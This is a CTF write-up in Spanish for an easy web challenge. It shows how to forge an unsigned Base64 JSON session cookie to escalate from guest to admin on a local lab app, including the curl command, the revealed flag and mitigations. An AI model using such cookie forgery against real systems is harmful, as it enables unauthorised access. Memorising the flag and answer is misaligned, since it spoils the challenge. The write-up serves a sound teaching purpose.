# 📋 Writeup Oficial: La Bóveda de Cookies

| Campo | Detalle |
| :--- | :--- |
| **Categoría** | Web / Autenticación Insegura |
| **Dificultad** | Fácil (Easy) |
| **Puntos** | 200 |
| **Flag** | `CHRONOS{c00k13_m4n1pul4t10n_uns1gn3d_v4ult_4921}` |

---

## 1. Resumen del Desafío

El portal **CyberVault** gestiona el acceso a una bóveda digital mediante credenciales de usuario. Se proporciona una cuenta de baja autorización (`invitado` : `invitado123`). Al iniciar sesión, la aplicación genera una cookie llamada `vault_session`. La vulnerabilidad radica en que el servidor almacena el rol del usuario en una estructura JSON codificada en Base64 **sin firma criptográfica (HMAC ni Secret Key)**, confiando plenamente en el valor provisto por el cliente.

---

## 2. Análisis de Vulnerabilidad

Al iniciar sesión como `invitado` y revisar las cookies en las herramientas de desarrollo del navegador (`F12 -> Application -> Storage -> Cookies`) o mediante cURL:

```text
vault_session = eyJ1c2VybmFtZSI6ICJpbnZpdGFkbyIsICJyb2xlIjogImd1ZXN0IiwgImF1dGhfdGltZSI6IDE3NzQ5MDAwMDB9
```

Al decodificar la cadena Base64:
```bash
echo "eyJ1c2VybmFtZSI6ICJpbnZpdGFkbyIsICJyb2xlIjogImd1ZXN0IiwgImF1dGhfdGltZSI6IDE3NzQ5MDAwMDB9" | base64 -d
```

Se obtiene el siguiente objeto JSON:
```json
{
  "username": "invitado",
  "role": "guest",
  "auth_time": 1774900000
}
```

Dado que no existe ningún mecanismo de validación de integridad (como un HMAC o firma digital), el servidor procesará cualquier payload que el cliente le envíe.

---

## 3. Pasos de Explotación

### Paso 1: Forjar la Cookie de Administrador
Modificar el valor de `role` a `admin`:

```json
{
  "username": "admin",
  "role": "admin"
}
```

Codificar el JSON modificado en Base64:
```bash
echo -n '{"username":"admin","role":"admin"}' | base64
```

Resultado Base64:
```text
eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0=
```

*(Nota: la aplicación también es compatible si el jugador establece directamente la cookie `role=admin`).*

### Paso 2: Enviar la Solicitud con la Cookie Manipulada
Enviar la petición HTTP al endpoint raíz con la cookie adulterada:

```bash
curl -s -b "vault_session=eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0=" http://localhost:8002/
```

### Paso 3: Recuperación de la Bandera
Al recibir un rol con privilegios de `admin`, el servidor renderiza el compartimento principal de la bóveda revelando la bandera:

```text
CHRONOS{c00k13_m4n1pul4t10n_uns1gn3d_v4ult_4921}
```

---

## 4. Mitigación y Buenas Prácticas

1. **Sesiones Criptográficamente Firmadas**: Nunca almacenar el rol o privilegios de un usuario en cookies no firmadas del lado del cliente. Utilizar el mecanismo de sesiones nativo de Flask con una `SECRET_KEY` criptográfica y aleatoria generada en runtime:
   ```python
   app.secret_key = os.urandom(32)
   session["role"] = "guest"
   ```
2. **Almacenamiento de Sesiones del Lado del Servidor (Server-Side Sessions)**: Guardar únicamente un identificador de sesión opaco (UUID/Session ID) en el cliente y almacenar los privilegios reales en una base de datos segura en memoria (ej. Redis).
3. **Atributos de Seguridad en Cookies**: Activar las directivas `HttpOnly`, `Secure` y `SameSite=Lax` para prevenir robo de cookies por ataques XSS.
